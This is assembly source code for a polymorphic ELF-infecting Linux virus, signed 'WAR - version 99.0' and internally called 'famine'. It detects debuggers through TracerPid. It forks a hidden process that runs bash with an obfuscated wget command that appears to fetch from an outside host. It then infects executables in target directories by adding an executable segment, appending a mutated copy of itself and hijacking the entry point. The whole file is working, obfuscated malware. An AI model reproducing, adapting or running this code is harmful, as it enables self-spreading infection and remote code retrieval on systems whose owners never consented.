%include "includes/header.s"

SECTION .TEXT EXEC WRITE
global  _start                              ;must be declared for linker (ld)

_start:   ;Entry-Point
PUSH

mov rbp, rsp
sub rbp, famine_size  ; reserve famine_size bytes on the stack
OBF_POLY_1
.poly_nop_1:
dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop

.check_status:		;open the /proc/self/status
xor rdi, rdi
dd 0x90909090
db 0x90
lea rdi, STACK(famine.file_path)


;BUILD STRING /proc/self/status FOR OBF
mov rsi, 0x1E40AEC66F2F
mov rax, 0x1122C0AC0100
add rsi, rax
mov qword[rdi], rsi
add rdi, 6
mov rsi, 0x500A87BF3341
mov rax, 0x2324DEAD3232
add rsi, rax
mov qword[rdi], rsi
add rdi, 6
mov rsi, 0x72729481A8
mov rax, 0x0102DFDFCC
add rsi, rax
mov qword[rdi], rsi
sub rdi, 12


mov rsi, O_RDONLY
mov rax, _open
syscall
cmp rax, 0
jl _exx

lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
mov rdi, rax   ; fd from previous read
mov rdx, 110
mov rax, _read
syscall
cmp rax, 0
jb _exx_pop

lea r12, STACK(famine.status_str)
mov r11, 7
.loop_status:
inc r12
cmp byte[r12], 0x0a
jne .nope
dec r11
cmp r11, 0
je .check_trcr
.nope:
loop .loop_status

.check_trcr:
add r12, 12
cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
jne _exx_pop



.opendir_proc:
	xor rdi, rdi
		dd 0x90909090
			db 0x90
	lea rdi, STACK(famine.commpath)
	mov rsi, 0x13203C936162
	lea rdi, STACK(famine.commpath)
	mov rax, 0x1C4332DF0ECD
	add rsi, rax
	mov qword[rdi], rsi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl _exx_pop
	mov r14, rax

.readdir_proc:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents_proc)
	mov rdi, r14
	mov rax, _getdents
	syscall
	test rax, rax
	jle .closedir_proc
	mov r13, 0
	mov r12, rax
	call .read_file
	jmp .readdir_proc

.closedir_proc:
	mov rdi, r14
	mov rax, _close
	syscall
	jmp .OUI


.read_file:
	xor rdi, rdi
		dd 0x90909090
			db 0x90
	lea rdi, STACK(famine.dirents_proc)
	add rdi, r13
	movzx edx, word[rdi+dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_DIR
	jne .nextfile_proc


;compute commfile path
.poly_xor_r10_1:
xor r10, r10
nop
nop
nop

.dirname_proc:
	lea rsi, STACK(famine.commpath)
	mov rax, 0x13203C936162
	mov r11, 0x1C4332DF0ECD
	add rax, r11
	mov qword[rsi], rax
	add r10, 6
	jb .dirname_proc

.filename_proc:
	mov al, byte[rdi]
	mov byte[rsi + r10], al
	inc r10
	inc rdi
	cmp byte[rdi], 0
	jne .filename_proc


.commfile:
	mov rax, 0x5CAEC3C0FF
	mov r11, 0x10BEABA230
	add rax, r11
	mov qword[rsi + r10], rax
	add r10, 6
	mov byte[rsi + r10], 0

;open the commfile
	xor rsi, rsi
	mov rax, _open
	lea rdi, STACK(famine.commpath)
	mov rdx, O_RDWR
	syscall
	test eax, eax
	jl .nextfile_proc

;read the commfile
	.poly_xor_rdi_6:
	xor rdi, rdi
		dd 0x90909090
			db 0x90
	OBF_PUSH_RAX
	mov rdi, rax
	mov rax, _read
	lea rsi, STACK(famine.commpath)
	mov rdx, 90
	syscall
	OBF_POP_R9
	test eax, eax
	jl .close_proc
	mov byte[rsi + rax - 1], 0x0
	lea rdi, [rel forbidden]
	call .strcmp
	cmp rax, 0
	je .done
	.close_proc:
	mov rdi, r9
	mov rax, _close
	syscall
	jmp .nextfile_proc


.strcmp:
	mov r10b, BYTE [rdi]
	mov r11b, BYTE [rsi]
	cmp r10b, 0
	je .end_cmp
	cmp r11b, 0
	je .end_cmp
	cmp r10b, r11b
	jne .end_cmp
	inc rdi
	inc rsi
	jmp .strcmp

.end_cmp:
	movzx rax, r10b
	movzx rbx, r11b
	sub rax, rbx
	ret

.done:
	OBF_POP_RDI		; this pop is required in case of Exit from strcmp cause we did a CALL in readdir_proc  and must pop its address
	jmp _exx_pop

.nextfile_proc:
	cmp r13, r12
	jl .read_file
	ret


.get_random:
	OBF_PUSH_RDI
	OBF_PUSH_R9
	push rsi
	OBF_PUSH_RAX
	push rdx
	push r11
	OBF_PUSH_R10

	lea rdi, [rel random]
	mov rsi, O_RDONLY
	mov rax, _open
	syscall					; OPEN /dev/urandom  EXIT if not work
	cmp rax, 0
	jl	.err_ex

	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 4
	lea rsi, STACK(famine.tmp_rand)
	syscall				; READ 8 RANDOM BYTE<3
	
	mov rax, _close
	syscall

	OBF_POP_R10
	pop r11
	pop rdx
	OBF_POP_RAX
	pop rsi
	OBF_POP_R9
	OBF_POP_RDI
	ret
	.err_ex:
	OBF_POP_R10
	pop r11
	pop rdx
	OBF_POP_RAX
	pop rsi
	OBF_POP_R9
	OBF_POP_RDI
	OBF_POP_RDI
	OBF_POP_RDI
	jmp _exx_pop

.OUI:
jmp .enc_start
;DECYPHER



.enc_start:

;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
.durex:
;FORK THE DUREX PROCESS !
	mov rax, _fork
	syscall
	cmp rax, 0
	jne .skip_durex

;	CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
	mov rax, _close
	mov rdi, 1
	syscall
	mov rax, _close
	mov rdi, 2
	syscall

	lea rdi, STACK(famine.status_str)
	lea rsi, STACK(famine.commpath)
	mov rax, 0x69622f
	mov qword[rdi], rax
	add rdi, 3
	mov rax, 0x687361622f6e
	mov qword[rdi], rax
	sub rdi, 3
	mov qword[rsi], rdi

	mov dword STACK(famine.new_dir), 0x0000632d
	lea rax, STACK(famine.new_dir)

	mov qword[rsi+8], rax
	add rax, 4

	mov byte[rax], 0x27
	inc rax
	mov r10, 0x74656777
	mov qword[rax], r10
	mov qword[rsi+16], rax
	add rax, 4
	mov r10b, 0x20
	mov byte[rax], r10b
	inc rax

	mov r10, 0x627F71E4CF734788
	mov r11, 0xAEF090990121DF
	add r10, r11
	mov qword[rax+8], r10
	mov r10, 0x1338087384BA29D6
	mov r11, 0x623758FEDC754399
	add r10, r11
	mov qword[rax+16], r10
	mov r10, 0x657480C882200252
	mov r11, 0xFEFE4A9AD123222
	add r10, r11
	mov qword[rax+24], r10
	mov r10, 0x58F9FA9117B35E00
	mov r11, 0x143567DE54AED178
	add r10, r11
	mov qword[rax+32], r10
	mov r10, 0x651A41E5BDEFB23E
	mov r11, 0x1029ED8CA784C123
	add r10, r11
	mov qword[rax+40], r10
	mov r10, 0x1FE9D6214E305123
	mov r11, 0xF45645222442345
	add r10, r11
	mov qword[rax], r10
	mov r10, 0x1BAAB6F9EB6664A5
	mov r11, 0x21CCAA78541200CD
	add r10, r11
	mov qword[rax+48], r10
	mov r10, 0x24167B8C5FA63D78
	mov r11, 0x0909E9E912CDFFFF
	add r10, r11
	mov qword[rax+54], r10
	mov r10, 0x5F5C631E0F3E
	mov r11, 0x742F111111111111
	add r10, r11
	mov qword[rax+62], r10
	mov r10, 0x20527BA8C39CA60E
	mov r11, 0x5412EDCCAD908712
	add r10, r11
	mov qword[rax+70], r10
	mov r10, 0x425B84450C07D917
	mov r11, 0x3409DFEA14675409
	add r10, r11
	mov qword[rax+78], r10
	mov r10, 0xEBAA7DC5A415D1E
	mov r11, 0x1165789012341111
	add r10, r11
	mov qword[rax+86], r10
	mov r10, 0x1A0A262C437B24DB
	mov r11, 0x55634236DCAB0145
	add r10, r11
	mov qword[rax+94], r10
	mov r10, 0x73FCDA4A89A6B921
	mov r11, 0x3245ECAD906743
	add r10, r11
	mov qword[rax+102], r10,
	mov r10, 0xEE0591FED833C10
	mov r11, 0x1145CD0086AC345D
	add r10, r11
	mov qword[rax+110], r10
	mov r10, 0x1CB03BEFFFD03BF
	mov r11, 0x7070707070707070
	add r10, r11
	mov qword[rax+118], r10
	mov r10, 0x55522D191E1C52C0
	mov r11, 0x1EDD43545612CDAD
	add r10, r11
	mov qword[rax+126], r10
	mov qword[rsi+24], 0x0
	mov rdx, 0
	mov rax, 59
	syscall
	.skip_durex:

	mov rax, _fork
	syscall
	cmp rax, 0
	jne _exx_pop

lea rdi, [rel infect_dir] ; load dir str
.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall				;	open directory
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax		; save dir_fd

.poly_nop_3:
dd 0x90909090
.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall				;	get directory entries
	test  rax,rax
	jle .closedir		;	no more entries
	mov r13, 0
	mov r12, rax

.file:
	; check directory entry for a regular file
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process		; process the file

.nextfile:
	cmp r13, r12		; check if directory entry looping is over 
	jl .file
	jmp .readdir		; read dir for more entry

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	mov ecx, 0
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb		; next infect_dir
	cmp byte[rdi], 0
	jnz .opendir
	POP		; restore register 
	jmp _exx.exit		;jump to the end

process:
	mov rsi, r14  ; r14 hold infect dir
	mov rax, rdi
	lea rdi, STACK(famine.file_path)  ; load stack addr to store file_path
	mov rdx, rdi

.dirname:
	movsb			; load dirname to rdi
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb			; append filename to dirname to get full path
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall			; open


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax		; save result from open to stack

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)	; file size from stat to rsi
	mov STACK(famine.file_size), rsi	; save file size to stack 
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE  ; check if size < ehdr_size + phdr size + famine_size
	jl .close
				;MMAP file
	mov r9, 0
	mov r8, STACK(famine.file_fd)  ; restore file_fd
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	.poly_xor_rdi_1:
	xor rdi, rdi
	dd 0x90909090
	db 0x90
	mov rax, _mmap
	syscall

	cmp rax, MMAP_ERRORS
	jae .close
	
	mov STACK(famine.file_data), rax	; save mmap to file from rax to stack
	mov rdi, rax						; 
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx  ; DYN
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx	; EXEC
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13		; save registers in case we need to restore 
	OBF_OVERWRITE_PUSHR14R15

	jmp .after_poly_crap_skipped
	POLY_CRAP_SKIPPED
	.after_poly_crap_skipped:


	mov r15, rdi ; save phdr[0] offset to r15
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi  ; save phdr[0] offset to r14

	.segment:
	cmp rcx, 0
	jl .return
	mov ax, SEGMENT_TYPE
	mov r11w, word [rdi]
	cmp ax, r11w
	jnz .next
	jmp .infect

	.next:
	add rdi, elf64_phdr_size  ; add phdr size to rdi to loop through pheaders
	dec rcx					  ; decrement phnum
	jmp .segment

	.infect:
	OBF_PUSH_RDI ; save phdr to infect offset to  stack

.get_rand_key:
	xor rdi, rdi
		dd 0x90909090
			db 0x90
	lea rdi, [rel random]
	mov rsi, O_RDONLY
	mov rax, _open
	syscall					; OPEN /dev/urandom  EXIT if not work
	cmp rax, 0
	jl	_exx_pop

	OBF_PUSH_RAX
	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 2
	lea rsi, STACK(famine.key)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	
	OBF_POP_RAX
	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 1
	lea rsi, STACK(famine.factor)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	mov rax, _close
	syscall

; get target End of file
	mov rdi, STACK(famine.file_fd) ; target fd to rdi
	mov rsi, 0 ; offset 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall
	OBF_PUSH_RAX; save eof from lseek to stack

;Here we check a presence of signature in case of a double PT_NOTE crap
	mov r13, STACK(famine.file_data)
	add r13, rax
	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
	cmp byte[r13], 'W'
	je .return_pop

	; get delta  ( address at execution time)
	call .delta
	.delta:
	pop r13
	sub r13, .delta
	
	; load cypher and write v
	lea rsi, [r13 + _start] ; load _start addr to rsi
	mov rdx, _end - _start  ; virus size to rdx
	lea r10, STACK(famine.tocypher)  ; r10 hold future v-location in stack
	.loading_v:
		mov r11b, byte[rsi]
		mov [r10], r11b
		inc rsi
		inc r10
		dec rdx
		cmp rdx, 0
		jg .loading_v


	lea r10, STACK(famine.tocypher)
	add r10,JUMP_DECYPHER_OFFSET
	mov byte[r10], 0

	;try and build array of offset to poly_nop
	;POLY NOP SETUP
	.poly_xor_r11_1:
	xor r11, r11
	nop
	nop
	nop
	nop
	nop
	
	lea r10, STACK(famine.poly_offsets)
	mov qword[r10], POLY_NOP_1_OFFSET
	mov qword[r10+8], POLY_NOP_2_OFFSET
	mov qword[r10+16], POLY_NOP_3_OFFSET
	mov qword[r10+24], POLY_NOP_4_OFFSET
	mov qword[r10+32], POLY_NOP_5_OFFSET
	mov qword[r10+40], POLY_NOP_6_OFFSET
	mov qword[r10+48], POLY_NOP_7_OFFSET
	mov qword[r10+56], POLY_NOP_8_OFFSET
	mov qword[r10+64], POLY_NOP_9_OFFSET
	mov word[r10+72], 0x1111
	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
	mov r9, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
	lea rsi, [rel poly_nop]
	call .poly_engine
	jmp .poly_xor1

	;HERE IT REPLACE 4 BYTE NOP AT POLY_NOP_1_OFFSET WITH 4 BYTE IDENTICAL AS NOP ; 

	;THE FUNCTION NEED : r10 ARRAY OF OFFSETS TO REPLACE WITH THIS POLY SET  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - r9 HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
	.poly_engine:
	call _start.get_random
	push rsi
	lea rcx, STACK(famine.tocypher)
	add rcx, qword[r10]
	.poly_xor_rdi_3:
	xor rdi, rdi
	dd 0x90909090
	db 0x90
	mov dil, byte STACK(famine.tmp_rand)
	cmp rdi, r11
	jl .moddone
	.mod:
	sub dil, r11b
	cmp rdi, r11
	jge .mod
	.moddone:
	mov rax, r9
	mul di
	mov dil, al
	add rsi, rdi
	push r11
	OBF_PUSH_R9
	.looping:
	mov r11b, byte[rsi]
	mov byte[rcx], r11b
	inc rsi
	inc rcx
	dec r9
	cmp r9, 0
	jne .looping
	OBF_POP_R9
	pop r11
	pop rsi
	add r10, 0x8	; SWITCH TO NEXT OFFSET TO REPLACE ON THE OFFSET TABLE
	cmp word[r10], 0x1111
	jne .poly_engine
	ret
	;END OF POLY ENGINE 

	.poly_xor1:
	xor r11, r11
	dd 0x90909090
	db 0x90
	lea r10, STACK(famine.poly_offsets)
	mov qword[r10], POLY_XOR_R10_1_OFFSET
	mov qword[r10+8], POLY_XOR_R10_2_OFFSET
	mov word[r10+16], 0x1111
	mov r11, POLY_XOR_NUMBER
	mov r9, POLY_XOR_SIZE
	lea rsi, [rel poly_xor_r10_r10]
	call .poly_engine

	.poly_xor_r11_3:
	xor r11, r11
	dd 0x90909090
	db 0x90
	xor r9, r9
	mov rsi, 0x8
	
	.poly_inc_r10:
	lea r10, STACK(famine.poly_offsets)
	mov qword[r10+r11], POLY_INC_R10_1_OFFSET
	add qword[r10+r11], r9
	add r11, 8
	add r9, 11
	dec rsi
	cmp rsi, 0
	jne .poly_inc_r10
	mov qword[r10+r11], 0x1111
	mov r11, POLY_INC_NUMBER
	mov r9, POLY_INC_SIZE
	lea rsi, [rel poly_inc_r10]
	call .poly_engine

	.poly_xor2:
	xor r11, r11
		dd 0x90909090
		db 0x90
	lea r10, STACK(famine.poly_offsets)
	mov qword[r10], POLY_XOR_R11_1_OFFSET
	mov qword[r10+8], POLY_XOR_R11_2_OFFSET
	mov qword[r10+16], POLY_XOR_R11_3_OFFSET
	mov qword[r10+24], POLY_XOR_R11_4_OFFSET
	mov qword[r10+32], POLY_XOR_R11_5_OFFSET
	mov qword[r10+40], POLY_XOR_R11_6_OFFSET
	mov qword[r10+48], 0x1111
	mov r11, POLY_XOR_R11_NUMBER
	mov r9, POLY_XOR_R11_SIZE
	lea rsi, [rel poly_xor_r11_r11]
	call .poly_engine

	.poly_xor3:
	xor r11, r11
		dd 0x90909090
			db 0x90
	lea r10, STACK(famine.poly_offsets)
	mov qword[r10], POLY_XOR_RDI_1_OFFSET
	mov qword[r10+8], POLY_XOR_RDI_2_OFFSET
	mov qword[r10+16], POLY_XOR_RDI_3_OFFSET
	mov qword[r10+24], POLY_XOR_RDI_4_OFFSET
	mov qword[r10+32], POLY_XOR_RDI_5_OFFSET
	mov qword[r10+40], POLY_XOR_RDI_6_OFFSET
	mov qword[r10+48], POLY_XOR_RDI_7_OFFSET
	mov qword[r10+56], POLY_XOR_RDI_8_OFFSET
	mov qword[r10+64], 0x1111
	mov r11, POLY_XOR_RDI_NUMBER
	mov r9, POLY_XOR_RDI_SIZE
	lea rsi, [rel poly_xor_rdi_rdi]
	call .poly_engine


;	lea r10, STACK(famine.tocypher)
;	add r10, KEY_OFFSET
;	mov r11b, STACK(famine.key)
;	mov byte[r10], r11b

;	lea r10, STACK(famine.tocypher)
;	add r10, FACTOR_OFFSET
;	mov r11b, STACK(famine.factor)
;	mov byte[r10], r11b

	push r12
	xor r12, r12
	
	lea r10, STACK(famine.tocypher)
	add r10, SIGNATURE_OFFSET
	mov r11b, STACK(famine.morph_sign_u)
	mov r12b, STACK(famine.morph_sign_d)
	cmp r11b, 7
	jl .fp
	inc r12b
	.poly_xor_r11_5:
	mov r11, 0
	dw 0x9090
	.fp:						;increase signature 
	inc r11b
	add byte[r10], r12b
	.poly_inc_r10_1:
	add r10, 1
	dd 0x90909090
	add byte[r10], r11b
	add r10, 1
	dd 0x90909090
	add byte[r10], r12b
	add r10, 1
	dd 0x90909090
	add byte[r10], r11b
	add r10, 1
	dd 0x90909090
	add byte[r10], r12b
	add r10, 1
	dd 0x90909090
	add byte[r10], r11b
	add r10, 1
	dd 0x90909090
	add byte[r10], r12b
	add r10, 1
	dd 0x90909090
	add byte[r10], r11b
	add r10, 1
	dd 0x90909090
	mov r12b, byte STACK(famine.tmp_rand)		;load random val 
	add byte[r10], r12b							;add random val to last signature byte
	.done_finger:
	mov STACK(famine.morph_sign_u), r11	;	save current signature state
	mov STACK(famine.morph_sign_d), r12	;	save current signature state

	call _start.get_random
	lea r10,STACK(famine.tocypher)
	add r10, POLY_OFFSET_1
	mov r12, STACK(famine.tmp_rand)
	mov dword[r10], r12d

	call _start.get_random
	lea r10, STACK(famine.tocypher)
	add r10, POLY_CRAP_SKIPPED_OFFSET
	mov rsi, 7

	.patch_poly_crap:
	call _start.get_random
	mov r12, STACK(famine.tmp_rand)
	mov dword[r10], r12d
	add r10, 4
	dec rsi
	cmp rsi, 0
	jne .patch_poly_crap

;CYPHER
	pop r12

	mov rdi, STACK(famine.file_fd) ; fd to rdi
	lea rsi, STACK(famine.tocypher)
	mov rdx, _end - _start  ; virus size to rdx
	OBF_POP_R10 ; rax hold eof from lseek syscall 
	OBF_PUSH_R10
	mov rax, _pwrite
	syscall
	cmp rax, 0
	jbe .return

	.edit_phdr:
	OBF_POP_RAX				;RDI = the offset of patched PHEADER
	OBF_POP_RDI
	OBF_PUSH_RDI
	OBF_PUSH_RAX
	mov dword [rdi], 1
	mov eax, PF_R	; READ
	or eax, PF_X	; EXEC
	or eax, PF_W	; WRITE
	mov dword [rdi + 4], eax   ;SET PERMS !
	OBF_POP_RAX				; RAX = The offset of our injected V , (old EOF)
	mov [rdi + 8], rax  ; set phdr.offset  = rax
	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
	add r13, 0xc000000 ; add vsize to r13
	mov [rdi + 16], r13 ; edit  p_vaddr
	mov [rdi + 24], r14 ; change paddr to new size
	mov qword [rdi + 48], 0x200000  ; set align to 2mb
	add qword [rdi + 32], _end - _start + 5
	add qword [rdi + 40], _end - _start + 5

	.edit_ehdr:
	mov rdi, STACK(famine.file_data)
	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
	mov [rdi + elf64_ehdr.e_entry], r13 ; set ehdr.e_entry to vaddr of injected
	
	;write it
	mov rdi, STACK(famine.file_fd)
	mov rsi, r15
	mov rdx, EHDR_SIZE				; 64 is size of EHDR
	.poly_xor_r10_2:
	mov r10, 0
	mov rax, _pwrite
	syscall

	.jmp_wuw:
	xor rdi, rdi
		dd 0x90909090
			db 0x90
	mov rdi , STACK(famine.file_fd)
	mov rsi, 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall						; seek to file_end
	
;	compute jump value
	OBF_POP_RDI ;   restore patched pheader 
	mov rdx, [rdi + elf64_phdr.p_vaddr]
	sub rdx, RETURN_JUMP_VALUE_OFFSET
	sub r14, rdx
	sub r14, _end - _start
	mov byte STACK(famine.jmp), JMP; jmp opcode
	mov dword STACK(famine.jmp + 1), r14d

;write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, STACK(famine.jmp)
	mov rdx, 5
	sub rax, RETURN_JUMP_OFFSET  ; offset between _end:  and jump .exit
	mov r10, rax ; EOF From last call to lseek
	mov rax, _pwrite
	syscall

	mov rax, _sync
	syscall
	
	jmp .return
	.return_pop:
	OBF_POP_RAX
	OBF_POP_RDI
	.return :
		pop r15		; restore saved registers
		pop r14
		pop r13
		ret


;POLYMORPHIC 4 BYTE NOP WITH DIFFERENT OPCODE
poly_nop:	add r10, 0
			add r15, 0
			or rax, 0
			and rbx, -1
			and rsp, -1
			add rcx, 0
			or rsi, 0
			dd 0x90909090
			mov rbp, rbp
				db 0x90
			mov rsi, rsi
				db 0x90


; POLYMORPHIC 6 BYTE xor r10, r10 WITH IFFERENT OPCODES
poly_xor_r10_r10:	push 0
					pop r10
						push rax
						pop rax

					and r10, 0
						push rbx
						pop rbx

					sub r10, r10
						mov rax, rax

					xor r10, r10
						mov rbp, rbp

					xor r10, r10
						mov rbx, rbx

					sub r10, r10
						mov rcx, rcx

					mov r10d, 0


poly_xor_rdi_rdi:	push 0
					pop rdi
						.poly_nop_10:
						dd 0x90909090
						db 0x90

					and rdi, 0
						.poly_nop_11:
						dd 0x90909090

					sub rdi, rdi
						.poly_nop_12:
						dd 0x90909090
							db 0x90

					xor rdi, rdi
						.poly_nop_13:
						dd 0x90909090
							db 0x90
					
					mov rdi, 0
						dw 0x9090
							db 0x90



poly_xor_r11_r11:	push 0
						pop r11
						.poly_nop_6:
						dd 0x90909090

					and r11, 0
						.poly_nop_7:
						dd 0x90909090

					sub r11, r11
						.poly_nop_8:
						dd 0x90909090
							db 0x90

					xor r11, r11
						.poly_nop_9:
						dd 0x90909090
							db 0x90
					
					mov r11, 0
						dw 0x9090

; POLYMORPHIC 8BYTE inc r10
poly_inc_r10:	inc r10
					.poly_nop_4:
					dd 0x90909090
					db 0x90

				add r10, 1
					.poly_nop_5:
					dd 0x90909090

				sub r10, 0x7
				add r10, 0x8

				sub r10, 0x2
				add r10, 0x3

				add r10, 0x32
				sub r10, 0x31


infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
enc_end:
	db 0
signature		db			0x00, 'WAR      - version 99.0 (c)oded by <araout>42424242', 0x0, 0xa
forbidden		db			"test.out", 0
famine_entry	dq			_start
random			db			"/dev/urandom",0,0

_exx_pop:
POP
_exx:
jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
		db 00, 00, 00, 00, 00
	.exit:
		mov rax, _exit
		mov rdi, 0
		syscall
_end:
